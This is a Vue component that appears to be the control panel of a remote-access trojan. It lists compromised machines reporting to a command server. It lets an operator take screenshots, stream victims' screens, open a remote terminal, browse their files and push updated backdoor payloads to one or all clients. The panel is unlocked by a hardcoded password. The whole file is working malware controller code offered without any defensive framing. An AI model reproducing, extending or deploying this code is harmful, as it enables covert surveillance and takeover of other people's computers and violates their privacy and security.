<template>
  <div id="trojan" @click="clearSelectedId(event)">
    <div v-show="!$store.state.clients.verify.show">
      <input v-model="verify.password" style="margin-right: 7px" />
      <button @click="verifyPassword">verify</button>
    </div>
    <div
      id="clients-content-wrapper"
      v-if="$store.state.clients.verify.show"
      style="display: flex; flex-direction: column; align-items: center"
    >
      <p :style="status_style">{{ server_status }}</p>
      <div id="client-button-group">
        <button
          v-show="!selectedId"
          style="margin-bottom: 4px"
          @click="updateAllClients"
        >
          更新所有客户端
        </button>
        <div id="client-selected-button-group" v-if="selectedId">
          <button class="clientButton" @click="showClientDetails(selectedId)">
            详细信息
          </button>
          <button class="clientButton" @click="toControlPage(selectedId)">
            终端
          </button>
          <button class="clientButton" @click="getScreenshot(selectedId)">
            获取截图
          </button>
          <button class="clientButton" @click="stopVideoCapture">
            停止推流
          </button>
          <button class="clientButton" @click="startVideoCapture(selectedId)">
            开始推流
          </button>
          <button class="clientButton" @click="showFileExplorer(selectedId)">
            显示文件浏览器
          </button>
          <button class="clientButton" @click="updateThisClient(selectedId)">
            更新此客户端
          </button>
        </div>
      </div>
      <div v-if="screenshot.src" class="scrennshotWrapper">
        <p @click="clearImg">X</p>
        <img
          id="screenshot"
          :src="screenshot.src"
          :style="screenshotStyle"
          @click="scaleTrigger"
        />
      </div>
      <div id="ClientGroup">
        <template v-for="i in clientArr" :key="i.id">
          <div
            :class="{
              client: true,
              streaming: i.streaming,
              clientselected: checkSelected(i.id),
            }"
            @click="showContextMenu(event, i.id)"
          >
            <p>ID: {{ i.id }}</p>
            <p>主机名: {{ i.主机名 }}</p>
            <p>平台: {{ i.系统版本名 }}</p>
          </div>
        </template>
        <p v-show="!clientArr.length">列表为空</p>
      </div>
      <context-menu
        :contextMenu="$store.state.contextMenu"
        :msg="msg"
        :template="contextMenu.template"
      ></context-menu>
      <notification></notification>
    </div>
  </div>
</template>

<script>
// const { ipcRenderer } = window.require("electron");
import sio from "socket.io-client";
import ss from "socket.io-stream";
import { SERVER_ADDRESS, SERVER_PORT } from "../../../my_config";
import ContextMenuVue from "../../components/ContextMenu.vue";
import NotificationVue from "../../components/Notification.vue";
export default {
  data() {
    return {
      verify: {
        password: "",
        show: false,
      },
      clientArr: [],
      selectedId: "",
      interval: null,
      touchTimeout: 0,
      // server_status: window.server_status,
      server_status: "未连接",
      newBackendName: "backend",
      screenshot: {
        enlarge: false,
        src: "",
      },
      contextMenu: {
        template: [
          {
            label: "显示此客户端详细信息",
            click: () => {
              for (let i = 0; i < window.clientArr.length; i++) {
                if (window.clientArr[i].id === this.msg.id) {
                  let str = "";
                  for (let item in window.clientArr[i]) {
                    str += `${item}: ${window.clientArr[i][item]}\n`;
                    // console.log(`${item}: ${window.clientArr[i][item]}`);
                  }
                  alert(str);
                  break;
                }
              }
              // alert(1);
            },
          },
          {
            label: "打开文件浏览器",
            click: () => {
              let that = this;
              console.log(this.msg.id);
              window.io.emit("apilistdir", that.msg.id, ".");
              that.$router.push({
                path: `/trojan/fileexplorer`,
                query: {
                  id: that.msg.id,
                },
              });
            },
          },
          {
            label: "获取此客户端屏幕截图",
            click: () => {
              window.io.emit("apigetscreenshot", this.msg.id);
            },
          },
          {
            label: "开启此客户端屏幕推流",
            click: () => {
              window.io.emit("apistartvideocapture", this.msg.id);
            },
          },
          // { type: "separator" },
          {
            label: "更新此客户端",
            click: () => {
              window.io.emit("apiupdatethisclient", this.msg.id, "backend");
            },
          },
          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
        show: false,
        mousePos: {
          screenX: 0,
          screenY: 0,
          clientX: 0,
          clientY: 0,
        },
      },
      msg: {},
    };
  },
  computed: {
    ca() {
      return this.$store.getters.getClientArr;
    },
    screenshotStyle() {
      return this.screenshot.enlarge
        ? {
            position: "fixed",
            left: "0",
            top: "0",
            right: "0",
            bottom: "0",
            margin: "auto",
            // height: "90vh",
            width: "80vw",
          }
        : {};
    },
    status_style() {
      let tmp = {};
      switch (this.server_status) {
        case "已连接": {
          tmp = { color: "green" };
          break;
        }
        case "未连接":
        case "已断开": {
          tmp = { color: "red" };
        }
      }
      return tmp;
    },
    checkSelected() {
      const that = this;
      return function (id) {
        if (id == that.selectedId) return true;
        else return false;
      };
    },
    checkStreaming() {
      return function (id) {};
    },
  },
  watch: {},
  beforeMount() {
    let that = this;
    document.documentElement.addEventListener("keydown", (e) => {
      if (e.key == "ArrowDown" && e.ctrlKey) {
        that.$store.state.clients.verify.show = !that.$store.state.clients
          .verify.show;
      }
      // if (e.key == "ArrowUp") {
      // }
    });
    document.documentElement.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });

    window.clientArr = [];
    window.cmdResult = {
      data: "",
    };
    window.io = sio.connect(`${SERVER_ADDRESS}:${SERVER_PORT}`, {
      // withCredentials: true,
    });
    window.ss = ss;
    window.server_status = "未连接";

    window.io.on("connect", () => {
      window.io.send({ admin: true });
      window.server_status = "已连接";
    });

    window.io.on("disconnect", () => {
      window.server_status = "已断开";
    });

    window.io.on("apigetallclients", (carr) => {
      window.clientArr = carr;
      window.server_status = "已连接";
    });

    window.io.on("apisendcmd", (cmdresult) => {
      window.cmdResult = cmdresult;
      console.log(cmdresult);
    });

    window.io.on("apigetscreenshot", (imgbase64) => {
      window.screenshot = `data:image/jpg;base64,${imgbase64}`;
    });

    window.io.on("debug", (msg) => {
      console.log(`--DEBUG:\n${msg}`);
    });

    this.interval = setInterval(() => {
      //!!
      window.io.emit("apigetallclients");

      that.clientArr = window.clientArr;
      that.server_status = window.server_status;
      that.screenshot.src = window.screenshot;
      that.$forceUpdate();
    }, 1000);

    // ipcRenderer.on("showFileExplorer", (e, id) => {
    //   window.io.emit("apilistdir", id, ".");
    //   that.$router.push({
    //     path: `/trojan/fileexplorer`,
    //     query: {
    //       id: id,
    //     },
    //   });
    // });
    // ipcRenderer.on("startVideoCapture", (e, id) => {
    //   window.io.emit("apistartvideocapture", id);
    // });
  },
  methods: {
    verifyPassword() {
      if (this.verify.password == "52013140") {
        this.$store.state.clients.verify.show = true;
      }
    },
    toControlPage(id) {
      // console.log("click", id);
      this.$router.push("/trojan/control/" + id);
    },
    showClientDetails(id) {
      for (let i = 0; i < window.clientArr.length; i++) {
        if (window.clientArr[i].id === id) {
          let str = "";
          for (let item in window.clientArr[i]) {
            str += `${item}: ${window.clientArr[i][item]}\n`;
            // console.log(`${item}: ${window.clientArr[i][item]}`);
          }
          alert(str);
          break;
        }
      }
    },
    getScreenshot(id) {
      window.io.emit("apigetscreenshot", id);
    },
    updateThisClient(id) {
      window.io.emit("apiupdatethisclient", id, "backend");
    },
    showContextMenu(event, id) {
      // window.ipcRenderer.send("show-context-menu", {
      //   id: id,
      //   newBackendName: this.newBackendName,
      // });

      event = event || window.event;

      // this.$store.state.contextMenu.show = !this.$store.state.contextMenu.show;
      this.$store.state.contextMenu.show = true;
      this.$store.state.contextMenu.mousePos.screenX = event.screenX;
      this.$store.state.contextMenu.mousePos.screenY = event.screenY;
      this.$store.state.contextMenu.mousePos.clientX = event.clientX;
      this.$store.state.contextMenu.mousePos.clientY = event.clientY;
      this.msg.id = id;
      if (this.selectedId == id) {
        this.selectedId = "";
      } else {
        this.selectedId = id;
      }
    },
    longPressShowContextMenu(id) {
      const that = this;
      that.touchTimeout = setTimeout(() => {
        that.touchTimeout = 0;
        that.showContextMenu(id);
      }, 1500);
    },
    updateAllClients() {
      window.io.emit("apiupdateallclients", this.newBackendName);
    },
    scaleTrigger() {
      this.screenshot.enlarge = !this.screenshot.enlarge;
    },
    clearImg() {
      // this.screenshot.src = "";
      window.screenshot = "";
      this.screenshot.enlarge = false;
    },
    clearSelectedId(event) {
      // event = event || window.event;
      // this.selectedId = "";
      // event.stopPropatation();
      // event.preventDefault();
    },
    longPressClearImg() {
      const that = this;
      that.touchTimeout = setTimeout(() => {
        that.clearImg();
      }, 700);
    },
    stopVideoCapture() {
      const that = this;
      for (const item of window.clientArr) {
        if (item["streaming"] || item["id"] == that.selectedId) {
          window.io.emit("apistopvideocapture", item["id"]);
        }
      }
    },
    startVideoCapture(id) {
      window.io.emit("apistartvideocapture", id);
    },
    showFileExplorer(id) {
      const that = this;
      window.io.emit("apilistdir", id, ".");
      that.$router.push({
        path: `/trojan/fileexplorer`,
        query: {
          id: id,
        },
      });
    },
  },
  components: {
    "context-menu": ContextMenuVue,
    notification: NotificationVue,
  },
};
</script>

<style lang="less">
#trojan {
  overflow: auto;
  // #clients-content-wrapper {
  //   overflow: auto;
  //   height: 60vh;
  // }
}
.scrennshotWrapper {
  position: relative;
  p {
    // border-radius: 100%;
    cursor: pointer;
    padding: 1px;
    color: white;
    background-color: rgba(155, 155, 155, 0.5);
    position: absolute;
    right: 5px;
    top: 5px;
    &:hover {
      background-color: rgb(104, 104, 104);
    }
  }
}
#screenshot {
  width: 50vw;
  // height: 30vh;
  transition: 0.3s;
  border: 1px solid black;
}
#ClientGroup {
  display: flex;
  flex-direction: row;
  overflow: auto;
  height: 60vh;
  // height: 400px;
  // height: 80%;
  padding-top: 10px;
  width: 100vw;
  box-sizing: border-box;
  padding: 5px 2% 0 2%;
  flex-wrap: wrap;
  align-items: flex-start;
  justify-content: space-between;

  .client {
    box-sizing: border-box;
    padding: 2%;
    border: 1px solid black;
    display: flex;
    flex-direction: column;
    justify-content: left;
    // margin: 0 1% 10px 1%;
    margin-bottom: 2%;
    text-align: left;
    // width: 46vw;
    width: 49%;

    p {
      // user-select: none;
    }

    &:hover {
      box-shadow: 0px 5px 10px gray;
      cursor: pointer;
      transition: 0.2s;
    }
  }
}

.streaming {
  animation: streaming infinite alternate 1.5s;
}

.clientselected {
  background-color: rgb(209, 209, 209);
  border: 3px rgb(6, 90, 158) solid !important;
}

#client-selected-button-group {
  display: flex;
  flex-wrap: nowrap;
  button {
    cursor: pointer;
  }
}

.clientButton {
  margin: 0 3px;
}

@keyframes streaming {
  from {
  }
  to {
    background-color: rgb(197, 231, 197);
  }
}
</style>
